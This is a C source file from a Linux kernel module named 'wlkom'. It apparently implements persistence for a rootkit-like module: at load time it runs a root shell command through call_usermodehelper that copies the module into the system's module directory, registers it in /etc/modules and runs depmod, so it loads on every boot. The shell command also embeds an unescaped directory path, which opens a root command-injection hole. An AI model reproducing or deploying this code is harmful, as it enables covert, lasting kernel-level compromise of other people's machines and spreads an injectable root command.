#include "persistence.h"

#include <linux/dcache.h>
#include <linux/fs.h>
#include <linux/fs_struct.h>
#include <linux/kmod.h>
#include <linux/path.h>
#include <linux/printk.h>
#include <linux/sched.h>
#include <linux/string.h>



int wlkom_build_ko_path(char *buf, size_t size)
{
    struct path pwd;
    char tmp[WLKOM_PATH_MAX];
    char *cwd;
    int n;

    /* current is still the insmod process during __init */
    get_fs_pwd(current->fs, &pwd);
    cwd = d_path(&pwd, tmp, sizeof(tmp));
    path_put(&pwd);

    if (IS_ERR(cwd))
    {
        return PTR_ERR(cwd);
    }

    n = snprintf(buf, size, "%s/wlkom.ko", cwd);
    return (n < (int)size) ? 0 : -ENAMETOOLONG;
}

int wlkom_persist(void) 
{
    char cmd[WLKOM_PERSIST_CMD_MAX];
    char src[WLKOM_PATH_MAX];
    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = {
        "HOME=/root",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL
    };
    int ret;

    ret = wlkom_build_ko_path(src, sizeof(src));
    if (ret < 0) 
    {
        pr_warn("wlkom: could not determine ko path: %d\n", ret);
        return ret;
    }

    pr_info("wlkom: installing persistence from %s\n", src);

    snprintf(cmd, sizeof(cmd),
        "cp '%s' \"/lib/modules/$(uname -r)/kernel/drivers/misc/\""
        " && (grep -qxF wlkom /etc/modules || echo wlkom >> /etc/modules)"
        " && depmod",
        src);

    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    if (ret != 0)
    {
        pr_warn("wlkom: persistence setup failed: %d\n", ret);
    }
    else
    {
        pr_info("wlkom: persistence installed\n");
    }

    return ret;
}
